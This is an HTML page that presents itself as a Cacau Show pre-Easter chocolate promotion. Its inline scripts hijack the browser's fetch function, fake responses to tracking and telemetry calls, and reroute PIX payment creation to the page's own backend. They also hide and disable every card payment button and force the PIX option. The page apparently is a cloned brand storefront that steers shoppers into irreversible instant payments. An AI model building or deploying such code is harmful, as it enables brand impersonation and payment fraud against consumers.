<!doctype html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Promocao Pre-Pascoa | Cacau Show</title>
    <meta name="description" content="Promocao Pre-Pascoa Cacau Show - Aproveite os melhores precos em chocolates!">
    <meta name="author" content="Cacau Show" />

    <link rel="preload" as="image" href="products/dreams-brownie-1.png" />
    <link rel="preload" as="image" href="products/dreams-dubai-pistache.png" />
    <link rel="preload" as="image" href="products/dreams-mil-folhas.png" />

    <script>
      (function () {
        if (typeof window === "undefined" || typeof window.fetch !== "function") return;

        var originalFetch = window.fetch.bind(window);
        var pixCache = null;

        window.fetch = function (input, init) {
          var url = typeof input === "string" ? input : (input.url || "");

          // 1. Bloqueia chamadas de rastreio que travam o checkout
          if (url.indexOf("ipapi.co") !== -1 || url.indexOf("send-utmify-order") !== -1 || url.indexOf("rum?") !== -1) {
            return Promise.resolve(new Response(JSON.stringify({ status: "skipped" }), { status: 200 }));
          }

          // 2. Intercepta e Formata a Criação do PIX
          if (url.indexOf("/create-pix-transaction") !== -1) {
            if (pixCache) return Promise.resolve(pixCache.clone());

            return originalFetch("/api/create-pix-transaction", init).then(async function(res) {
              if (res.ok) {
                var data = await res.json();
                
                // Mapeia o seu JSON para o formato que o index-SbekvIi0.js espera
                var mappedResponse = {
                  success: true,
                  data: {
                    id: data.id,
                    pix: {
                      qrcode: data.qrcode || data.pix_code || data.copy_and_paste
                    },
                    qrCode: data.qrcode || data.pix_code
                  }
                };

                var finalRes = new Response(JSON.stringify(mappedResponse), {
                  status: 200,
                  headers: { 'Content-Type': 'application/json' }
                });

                pixCache = finalRes.clone();
                return finalRes;
              }
              return res;
            });
          }

          // 3. Intercepta Checagem de Status
          if (url.indexOf("/check-transaction-status") !== -1) {
            var query = url.indexOf("?") !== -1 ? url.slice(url.indexOf("?")) : "";
            return originalFetch("/api/check-transaction-status" + query, init);
          }

          return originalFetch(input, init);
        };
      })();
    </script>

    <script>
      (function () {
        function enforcePixOnly() {
          var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
          var pixToggle = null;

          buttons.forEach(function (btn) {
            var text = (btn.textContent || "").toLowerCase();

            // Esconde opções de cartão
            if (text.indexOf("cartao") !== -1 || text.indexOf("credito") !== -1) {
              btn.style.display = "none";
              btn.disabled = true;
            }

            // Identifica botão de PIX
            if (text.indexOf("pix") !== -1 && text.indexOf("desconto") !== -1) {
              pixToggle = btn;
            }
          });

          // Clica no PIX apenas uma vez e se o QR Code não estiver visível
          if (pixToggle && !pixToggle.dataset.forced) {
            var hasQrCode = !!document.querySelector('img[src*="base64"], canvas, svg');
            if (!hasQrCode) {
              pixToggle.dataset.forced = "true";
              pixToggle.click();
            }
          }
        }

        // Inicia o observador apenas quando o body existir
        function initObserver() {
          if (!document.body) {
            setTimeout(initObserver, 50);
            return;
          }
          enforcePixOnly();
          var observer = new MutationObserver(enforcePixOnly);
          observer.observe(document.body, { childList: true, subtree: true });
        }

        if (document.readyState === "loading") {
          document.addEventListener("DOMContentLoaded", initObserver);
        } else {
          initObserver();
        }
      })();
    </script>

    <script type="module" crossorigin src="assets/index-SbekvIi0.js"></script>
    <link rel="stylesheet" crossorigin href="assets/index-CQVhuwHR.css">
</head>
<body>
    <div id="root"></div>
</body>
</html>
